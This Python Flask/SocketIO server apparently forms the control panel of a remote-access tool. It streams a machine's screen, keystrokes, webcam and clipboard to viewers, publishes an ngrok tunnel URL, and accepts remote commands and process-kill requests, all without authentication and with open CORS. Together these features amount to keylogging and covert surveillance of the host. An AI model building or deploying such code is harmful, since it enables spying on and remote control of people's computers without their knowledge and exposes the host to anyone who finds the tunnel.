import os
from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO
import processes as proc

app = Flask(__name__, template_folder="templates", static_folder="static")
app.config["SECRET_KEY"] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

_controller = None
_recorder   = None
_camera     = None


def init(controller_fn, recorder, camera):
    global _controller, _recorder, _camera
    _controller = controller_fn
    _recorder   = recorder
    _camera     = camera


@app.route("/")
def index():
    return render_template("viewer.html")


# ── Camera ────────────────────────────────────────────────────────────────────
@app.route("/camera/start", methods=["POST"])
def camera_start():
    if not _camera: return jsonify({"ok": False})
    ok = _camera.start()
    socketio.emit("camera_state", {"active": ok})
    return jsonify({"ok": ok})

@app.route("/camera/stop", methods=["POST"])
def camera_stop():
    if not _camera: return jsonify({"ok": False})
    _camera.stop()
    socketio.emit("camera_state", {"active": False})
    return jsonify({"ok": True})


# ── Processes ─────────────────────────────────────────────────────────────────
@app.route("/processes")
def get_processes():
    return jsonify(proc.get_processes())

@app.route("/processes/kill", methods=["POST"])
def kill_process():
    pid = request.json.get("pid")
    if not pid: return jsonify({"ok": False})
    ok = proc.kill_process(int(pid))
    return jsonify({"ok": ok})


# ── Control ───────────────────────────────────────────────────────────────────
@socketio.on("command")
def on_command(data):
    if _controller:
        try: _controller(data)
        except Exception: pass

@socketio.on("request_processes")
def on_request_processes():
    socketio.emit("processes_data", proc.get_processes())

@socketio.on("kill_process")
def on_kill_process(data):
    pid = data.get("pid")
    if pid:
        ok = proc.kill_process(int(pid))
        socketio.emit("processes_data", proc.get_processes())

@socketio.on("camera_on")
def on_camera_on():
    if _camera:
        ok = _camera.start()
        socketio.emit("camera_state", {"active": ok})

@socketio.on("camera_off")
def on_camera_off():
    if _camera:
        _camera.stop()
        socketio.emit("camera_state", {"active": False})


# ── Broadcast helpers ─────────────────────────────────────────────────────────
def broadcast_frame(b64):      socketio.emit("frame",          {"data": b64})
def broadcast_key(char):       socketio.emit("key",            {"char": char})
def broadcast_camera(b64):     socketio.emit("camera_frame",   {"data": b64})
def broadcast_clipboard(text): socketio.emit("clipboard",      {"text": text})
def broadcast_ngrok_url(url):  socketio.emit("ngrok_url",      {"url": url})


def run(host="0.0.0.0", port=9090):
    socketio.run(app, host=host, port=port, allow_unsafe_werkzeug=True)
